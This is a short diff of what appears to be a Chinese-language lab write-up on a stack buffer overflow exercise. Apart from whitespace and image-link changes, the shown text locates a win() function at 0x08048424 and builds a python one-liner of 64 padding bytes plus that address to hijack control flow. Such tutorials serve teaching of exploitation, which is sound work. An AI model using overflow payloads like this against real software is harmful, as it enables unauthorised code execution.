@@ -70,7 +70,7 @@ python -c "print 'a'\*64+ win\(\)入口地址"
 
 用gdb或者ida查看win\(\)入口地址
 
-![](/png/11.png) 
+![](/png/11.png)
 
 地址为0x08048424
 
@@ -78,9 +78,5 @@ python -c "print 'a'\*64+ win\(\)入口地址"
 
 python -c "print 'a'\*64+'\x24\x84\x04\x08'
 
-
-
-
-
-
+![](/png/12.png)
 
